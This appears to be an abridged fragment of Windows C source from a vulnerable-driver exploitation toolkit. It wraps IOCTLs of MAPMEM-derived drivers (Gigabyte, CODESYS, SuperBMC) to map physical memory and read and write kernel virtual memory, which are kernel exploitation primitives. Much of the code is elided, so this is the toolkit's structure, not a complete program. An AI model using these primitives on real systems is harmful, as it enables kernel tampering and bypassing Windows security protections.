...
//
// Gigabyte/CODESYS/SuperBMC/etc drivers are based on MAPMEM.SYS Microsoft
// Windows NT 3.51 DDK example from 1993.
//
 ...
 *
 */
PVOID MapMemMapMemory(_In_ HANDLE DeviceHandle,
    ...
    if (supCallDriver(DeviceHandle, g_MapMem_MapIoctl, &request,
                      sizeof(request), (PVOID)&pMapSection, sizeof(PVOID))) {
        return pMapSection;
    }
 ...
 *
 */
VOID MapMemUnmapMemory(_In_ HANDLE DeviceHandle, _In_ PVOID SectionToUnmap) {
    supCallDriver(DeviceHandle, g_MapMem_UnmapIoctl, &SectionToUnmap,
                  sizeof(PVOID), NULL, 0);
}
 ...
 *
 */
BOOL WINAPI GioVirtualToPhysicalEx(_In_ HANDLE DeviceHandle,
    ...
    if (supCallDriver(DeviceHandle, IOCTL_GDRV_VIRTUALTOPHYSICAL, &request,
 ...
 *
 */
BOOL WINAPI MapMemQueryPML4Value(_In_ HANDLE DeviceHandle,
 ...
 *
 */
BOOL WINAPI MapMemVirtualToPhysical(_In_ HANDLE DeviceHandle,
                                    _In_ ULONG_PTR VirtualAddress,
                                    _Out_ ULONG_PTR* PhysicalAddress) {
    return PwVirtualToPhysical(DeviceHandle, MapMemQueryPML4Value,
                               MapMemReadPhysicalMemory, VirtualAddress,
                               PhysicalAddress);
}
 ...
 *
 */
BOOL WINAPI MapMemReadWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                          _In_ ULONG_PTR PhysicalAddress,
    ...
    //
    mappedSection =
        MapMemMapMemory(DeviceHandle, PhysicalAddress, NumberOfBytes);
 ...
 *
 */
BOOL WINAPI MapMemReadPhysicalMemory(_In_ HANDLE DeviceHandle,
                                     _In_ ULONG_PTR PhysicalAddress,
                                     _In_ PVOID Buffer,
                                     _In_ ULONG NumberOfBytes) {
    return MapMemReadWritePhysicalMemory(DeviceHandle, PhysicalAddress, Buffer,
                                         NumberOfBytes, FALSE);
}
 ...
 *
 */
BOOL WINAPI MapMemWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                      _In_ ULONG_PTR PhysicalAddress,
                                      _In_reads_bytes_(NumberOfBytes)
                                          PVOID Buffer,
                                      _In_ ULONG NumberOfBytes) {
 ...
 *
 */
BOOL WINAPI MapMemWriteKernelVirtualMemory(_In_ HANDLE DeviceHandle,
    ...
    bResult = MapMemVirtualToPhysical(DeviceHandle, Address, &physicalAddress);

    if (bResult) {
        bResult = MapMemReadWritePhysicalMemory(DeviceHandle, physicalAddress,
 ...
 *
 */
BOOL WINAPI MapMemReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
                                          _In_ ULONG_PTR Address,
                                          _Out_writes_bytes_(NumberOfBytes)
                                              PVOID Buffer,
                                          _In_ ULONG NumberOfBytes) {
 ...
 *
 */
BOOL WINAPI MapMemRegisterDriver(_In_ HANDLE DeviceHandle,
